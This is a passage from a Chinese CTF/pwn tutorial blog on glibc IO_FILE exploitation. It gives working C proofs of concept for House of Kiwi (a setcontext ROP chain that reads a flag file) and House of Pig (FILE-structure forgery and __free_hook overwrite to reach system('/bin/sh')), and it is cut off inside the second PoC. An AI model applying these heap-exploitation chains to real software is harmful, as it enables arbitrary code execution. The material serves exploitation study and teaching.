<p>调用 <code>_IO_new_file_sync</code> 时 <code>rdx</code> 指向的是 <code>_IO_helper_jumps_</code> 结构，该结构同样可写。因此可以通过修改 <code>_IO_helper_jumps_</code> 中的内容来给寄存器赋值。还需要设置 <code>rsp</code> 指向提前布置好的 <code>rop</code> 的起始位置，同时设置 <code>rip</code> 指向 <code>ret</code> 指令。最后劫持程序流实现 <code>orw</code> 。</p>
<p>总体利用思路如下:</p>
<ul>
<li>利用 <code>large bin attack</code> 改位于 <code>_IO_file_jumps</code> 中的<code>_IO_file_sync</code>指针为 <code>setcontext + 61</code></li>
<li>修改<code>IO_helper_jumps + 0xA0</code> 和 <code>IO_helper_jumps + 0xA8 </code>分别为可迁移的存放有 <code>rop</code> 的位置和 <code>ret</code> 指令或者 <code>rop</code> 首个指令地址的位置,则可以进行栈迁移</li>
</ul>
<p><strong>poc</strong></p>
<p>来自 <a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_kiwi" >_sky123_老师 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdi_ret libc_base + 0x2da82</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdx_r12 libc_base + 0x107191</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rsi_ret libc_base + 0x37bba</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rax_ret libc_base + 0x446d0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_ret libc_base + 0x88236</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ret pop_rdi_ret+1</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> libc_base;</span><br><span class="line"><span class="type">size_t</span> ROP[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">char</span> FLAG[] = <span class="string">&quot;./flag\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdin,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line"></span><br><span class="line">    libc_base  = ((<span class="type">size_t</span>)setvbuf) - <span class="number">0x7a4e0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> magic_gadget = libc_base + <span class="number">0x50bd0</span> + <span class="number">61</span>; <span class="comment">// setcontext + 61</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> _IO_helper_jumps = libc_base + <span class="number">0x1f3980</span>; <span class="comment">// _IO_helper_jumps</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> _IO_file_sync = libc_base + <span class="number">0x1f45e0</span>; <span class="comment">// sync pointer in _IO_file_jumps</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rax_ret;</span><br><span class="line">    ROP[i++] = <span class="number">2</span>;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)FLAG;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = syscall_ret;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">3</span>;</span><br><span class="line">    ROP[i++] = pop_rdx_r12;</span><br><span class="line">    ROP[i++] = <span class="number">0x100</span>;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)(FLAG + <span class="number">0x10</span>);</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)read;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">1</span>;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)write;</span><br><span class="line">	<span class="comment">// 设置rsp</span></span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_helper_jumps + <span class="number">0xA0</span>/<span class="number">8</span>) = (<span class="type">size_t</span>)ROP; </span><br><span class="line">    <span class="comment">// 设置rcx 即 程序setcontext运行完后会首先调用的指令地址</span></span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_helper_jumps + <span class="number">0xA8</span>/<span class="number">8</span>) = ret; </span><br><span class="line"> 	<span class="comment">// 设置fflush(stderr)中调用的指令地址</span></span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_file_sync) = magic_gadget;</span><br><span class="line">    <span class="comment">// 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert</span></span><br><span class="line">    <span class="type">size_t</span> *top_size = (<span class="type">size_t</span>*)((<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x10</span>) + <span class="number">0x18</span>);</span><br><span class="line">    <span class="comment">// top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中</span></span><br><span class="line">    <span class="comment">// 其中有个判断top_chunk的size中inuse位是否存在</span></span><br><span class="line">    *top_size = (*top_size)&amp;<span class="number">0xFFE</span>; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// 触发assert</span></span><br><span class="line"></span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231025114912932.png"
                      alt="image-20231025114912932"
                ></p>
<p><strong>glibc-2.36 的执行流</strong></p>
<p><code>glibc-2.36</code> 的 <code>__malloc_assert</code> 发生重大改变，直接通过系统调用不走 <code>IO</code>，该方法失效。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">_Noreturn <span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  __libc_message (do_abort, <span class="string">&quot;\</span></span><br><span class="line"><span class="string">Fatal glibc error: malloc assertion failure in %s: %s\n&quot;</span>,</span><br><span class="line">		  function, assertion);</span><br><span class="line">  __builtin_unreachable ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="House-of-pig"><a href="#House-of-pig" class="headerlink" title="House of pig"></a>House of pig</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>再来看一下 <code>_IO_str_overflow</code> 函数：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">char</span> *new_buf;</span><br><span class="line">	  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base; <span class="comment">// 覆盖到这里</span></span><br><span class="line">	  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">	  <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">	  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">	    <span class="keyword">return</span> EOF;</span><br><span class="line">	  new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 调用malloc</span></span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">	      <span class="keyword">return</span> EOF;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">if</span> (old_buf)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);<span class="comment">// 调用memecpy，覆盖</span></span><br><span class="line">	      <span class="built_in">free</span> (old_buf); <span class="comment">// 调用free</span></span><br><span class="line">	      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">	      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line">      ...</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>利用流程如下：</p>
<ul>
<li>将<code>_IO_buf_base</code> 指向 <code>/bin/sh\x00</code> 地址。</li>
<li>控制<code>_IO_buf_end-_IO_buf_base</code> 的值也就是 <code>new_size</code> 的值，进而控制分配的 <code>chunk</code> 的大小，分配到布局好的地址。</li>
<li>利用 <code>memcpy</code> 中覆盖地址，也就是 <code>malloc</code> 出来的 <code>new_buf</code>， 可以覆盖<code>__malloc_hook/__free_hook</code> 等</li>
<li>最后调用 <code>free(old_buf) -&gt; system(&quot;/bin/sh&quot;)</code>，</li>
</ul>
<p>在 <code>glibc-2.34</code> 后 <code>ptmalloc</code> 取消了各种 <code>hook</code>，但依然可以用 <code>house of pig</code> 实现任意地址写任意值，借助其他手段完成权限获取，后面有时间会做补充。</p>
<p><code>House of Pig</code> 是一个将 <code>Tcache Statsh Unlink Attack</code> 和 <code>FSOP</code> 结合的攻击，同时使用到了 <code>Largebin Attack</code> 进行辅助。主要适用于 <code>libc 2.31</code> 及以后的新版本 <code>libc</code> 并且程序中仅有 <code>calloc</code> 时。</p>
<p>利用条件为：</p>
<ul>
<li>存在 <code>UAF</code></li>
<li>能执行 <code>abort</code> 流程或程序显式调用 <code>exit</code> 或程序能通过主函数返回。</li>
</ul>
<h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a><a class="link"   href="https://github.com/Hornos3/pwnfile" >POC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLACK       <span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED         <span class="string">&quot;31&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN       <span class="string">&quot;32&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW      <span class="string">&quot;33&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE        <span class="string">&quot;34&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE      <span class="string">&quot;35&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN_DARK  <span class="string">&quot;36&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WHITE       <span class="string">&quot;37&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDEFINED   <span class="string">&quot;-1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT   <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDERLINE   <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPARK       <span class="string">&quot;5&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_END      <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printf_color</span><span class="params">(<span class="type">char</span>* color, <span class="type">char</span>* effect, <span class="type">char</span>* string)</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, <span class="string">&quot;\033[&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(effect[<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, effect);</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, color);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="string">&quot;m&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, string);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span> STR_END, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;今天我们来学习一下house of pig的利用原理。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;house of pig在只能使用calloc进行内存分配的CTF赛题中也有用武之地。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;首先我们了解一下这种利用方式的基本原理。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;本程序运行于ubuntu 20.04, glibc版本为2.31-0ubuntu9.9。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;在glibc 2.31下，house of pig需要利用__free__hook。\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(RED, HIGHLIGHT, <span class="string">&quot;第一步：获取libc的加载地址及堆地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;通过puts函数获取libc加载地址，在本libc中其偏移为0x84420。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)puts;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x84420</span>;</span><br><span class="line">    <span class="built_in">printf_color</span>(YELLOW, HIGHLIGHT, <span class="string">&quot;libc的加载地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> HIGHLIGHT <span class="string">&quot;;&quot;</span> YELLOW <span class="string">&quot;m%#zx\n&quot;</span> STR_END, libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;然后我们通过分配一个chunk（大小为0x500）来获得一个堆地址。\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> chunk_1 = (<span class="type">size_t</span>) <span class="built_in">malloc</span>(<span class="number">0x4F0</span>) - <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">printf_color</span>(YELLOW, HIGHLIGHT, <span class="string">&quot;获得堆地址为这个chunk的起始地址：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> HIGHLIGHT <span class="string">&quot;;&quot;</span> YELLOW <span class="string">&quot;m%#zx\n\n&quot;</span> STR_END, chunk_1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(RED, HIGHLIGHT, <span class="string">&quot;第二步：通过large bin attack或其他方法将__free_hook附近写上一个堆地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;为了方便起见，本程序直接对__free_hook附近地址进行修改。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;在实际应用中，我们要维护好这个堆地址，在后面的步骤中还会用到。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(PURPLE, HIGHLIGHT, <span class="string">&quot;这里在__free_hook-0x10处写入刚才获得的堆地址。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;本libc中__free_hook的偏移为0x1EEE48。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> __free_hook = libc_base + <span class="number">0x1EEE48</span>;</span><br><span class="line">    <span class="built_in">printf_color</span>(YELLOW, HIGHLIGHT, <span class="string">&quot;__free_hook的地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> HIGHLIGHT <span class="string">&quot;;&quot;</span> YELLOW <span class="string">&quot;m%#zx\n&quot;</span> STR_END, __free_hook);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* vuln_1 = (<span class="type">size_t</span>*)(__free_hook - <span class="number">0x8</span>);</span><br><span class="line">    <span class="comment">// ---------- 第一处漏洞利用 ---------- //</span></span><br><span class="line">    *vuln_1 = chunk_1;</span><br><span class="line">    <span class="comment">// --------------------------------- //</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(BLUE, HIGHLIGHT, <span class="string">&quot;第一处漏洞利用完成，已在__free_hook-0x10处写入堆地址。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(RED, HIGHLIGHT, <span class="string">&quot;第三步：通过large bin attack或其他方法向_IO_list_all写入一个堆地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;本libc中__free_hook的偏移为0x1ED5A0。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* _IO_list_all = (<span class="type">size_t</span>*)(libc_base + <span class="number">0x1ED5A0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;_IO_list_all中原本保存的应该是_IO_2_1_stderr_这个文件结构体实例。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;在程序调用exit函数时会对_IO_list_all中的FILE结构体依次进行遍历。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;exit函数的调用链为：exit-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;下面是_IO_flush_all_lockp的函数定义：\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/genops.c， line 684)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;int\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_flush_all_lockp (int do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int result = 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  FILE *fp;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#ifdef _IO_MTSAFE_IO\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_cleanup_region_start_noarg (flush_cleanup);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_lock_lock (list_all_lock);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#endif\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  \033[1;31mfor (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      run_fp = fp;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t_IO_flockfile (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t   || (_IO_vtable_offset (fp) == 0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t   )\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tresult = EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t_IO_funlockfile (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      run_fp = NULL;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#ifdef _IO_MTSAFE_IO\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_lock_unlock (list_all_lock);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_cleanup_region_end (0);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#endif\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return result;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;注意红色部分的代码，这便是遍历_IO_list_all链中的所有FILE实例。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;其中一条if语句的判断条件中会调用_IO_OVERFLOW函数。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;这个函数指的是vtable中overflow那个字段对应的函数。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;要执行到这个函数，就必须要让前面一个判断条件满足。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;这也就是我们伪造FILE结构体时需要注意的地方。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;下面我们就来修改_IO_list_all的值，用一个chunk地址填充。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> chunk_2 = (<span class="type">size_t</span>) <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0xF0</span>) - <span class="number">0x10</span>;</span><br><span class="line">    <span class="comment">// ---------- 第二处漏洞利用 ---------- //</span></span><br><span class="line">    *_IO_list_all = chunk_2;</span><br><span class="line">    <span class="comment">// --------------------------------- //</span></span><br><span class="line">    <span class="built_in">printf_color</span>(YELLOW, HIGHLIGHT, <span class="string">&quot;这个chunk的起始地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> HIGHLIGHT <span class="string">&quot;;&quot;</span> YELLOW <span class="string">&quot;m%#zx\n&quot;</span> STR_END, chunk_2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(RED, HIGHLIGHT, <span class="string">&quot;第四步：伪造FILE结构体。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;我们使用第二次分配到的chunk作为假FILE结构体进行构造。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;再次强调注意_IO_flush_all_lockp函数的限定条件。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;if语句的前一个判断条件是两个判断相或，我们只需要满足第一个判断即可：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(RED, HIGHLIGHT, <span class="string">&quot;fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;其中_mode字段的偏移为0xC0，_IO_write_ptr为0x28，_IO_write_base为0x30。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;我们在_mode处填0，在_IO_write_ptr填1，在_IO_write_base填0就可以了。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* fake_FILE = (<span class="type">size_t</span>*) chunk_2;</span><br><span class="line">    fake_FILE[<span class="number">0xC0</span> / <span class="number">8</span>] = <span class="number">0</span>;    <span class="comment">// _mode</span></span><br><span class="line">    fake_FILE[<span class="number">0x20</span> / <span class="number">8</span>] = <span class="number">1</span>;</span><br><span class="line">    fake_FILE[<span class="number">0x28</span> / <span class="number">8</span>] = <span class="number">0xFFFFFFFFFFFF</span>;    <span class="comment">// _IO_write_ptr</span></span><br><span class="line">    fake_FILE[<span class="number">0x30</span> / <span class="number">8</span>] = <span class="number">0</span>;    <span class="comment">// _IO_write_base</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span 